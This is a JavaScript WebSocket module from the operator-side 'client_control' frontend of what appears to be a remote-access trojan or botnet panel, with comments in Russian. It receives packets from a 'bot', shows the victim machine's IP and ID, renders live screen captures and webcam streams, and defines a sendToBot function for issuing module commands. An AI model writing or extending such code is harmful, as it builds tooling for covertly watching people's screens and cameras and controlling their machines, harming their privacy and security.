/* frontend/client_control/js/modules/websocket/connection.js */
import { AppState } from '../core/states.js';
import { decodePacket, encodePacket } from '../../../../dashboard/js/modules/websocket/protocol.js';
import { renderScreenRGBA } from '../features/screen_renderer.js';

let socket = null, botWatchdog = null, isRendering = false;
const decoder = new TextDecoder();

const updateUI = (id, val) => {
    const el = document.getElementById(id);
    if (el) el.textContent = val || '...';
};

const setOnline = (isOnline) => {
    document.getElementById('status-indicator')?.classList.toggle('online', isOnline);
    updateUI('status-text', isOnline ? 'online' : 'offline');
};

function handleIncomingData(buffer) {
    const pkg = decodePacket(buffer);
    if (!pkg || pkg.id !== AppState.clientId) return;

    setOnline(true);
    clearTimeout(botWatchdog);
    botWatchdog = setTimeout(() => setOnline(false), 10000);

    switch (pkg.module) {
        case 'DataScribe':
        case 'Heartbeat':
            try {
                const data = JSON.parse(decoder.decode(pkg.payload));
                if (data.ip) updateUI('display-ip', data.ip);
                if (data.id) updateUI('display-id', data.id);
            } catch (e) { console.warn("[WS] Metadata JSON Error"); }
            break;

        case 'ScreenWatch':
            if (isRendering) return;

            // Скрываем оверлей "No desktop data" при получении изображения
            const desktopOverlay = document.querySelector('#view-desktop .stream-overlay');
            if (desktopOverlay) desktopOverlay.style.display = 'none';

            isRendering = true;
            renderScreenRGBA(pkg.payload).finally(() => { isRendering = false; });
            break;

        case 'Webcam':
            // Скрываем оверлей камеры
            const webcamOverlay = document.querySelector('#view-webcam .stream-overlay');
            if (webcamOverlay) webcamOverlay.style.display = 'none';

            if (window.renderStream) {
                window.renderStream('webcam-view', pkg.payload, 'webcam-placeholder');
            }
            break;

        default:
            window.dispatchEvent(new CustomEvent('binaryDataReceived', { detail: pkg }));
    }
}

export function initControlConnection() {
    const token = localStorage.getItem('auth_token');
    const login = localStorage.getItem('user_login');
    if (!token || !login || !AppState.clientId) return;

    const prot = location.protocol === 'https:' ? 'wss:' : 'ws:';
    socket = new WebSocket(`${prot}//${location.host}/ws?token=${token}&login=${login}&mode=control`);
    socket.binaryType = 'arraybuffer';

    socket.onopen = () => {
        window.sendToBot?.("DataScribe", "get_metadata");
        setInterval(() => {
            if (socket?.readyState === 1) socket.send(encodePacket("", "Heartbeat", "ping"));
        }, 25000);
    };

    socket.onmessage = (e) => {
        if (e.data instanceof ArrayBuffer) handleIncomingData(e.data);
    };

    socket.onclose = () => {
        setOnline(false);
        clearTimeout(botWatchdog);
    };

    window.sendToBot = (mod, pay) => {
        if (socket?.readyState === 1) {
            socket.send(encodePacket(AppState.clientId, mod, pay));
        }
    };
}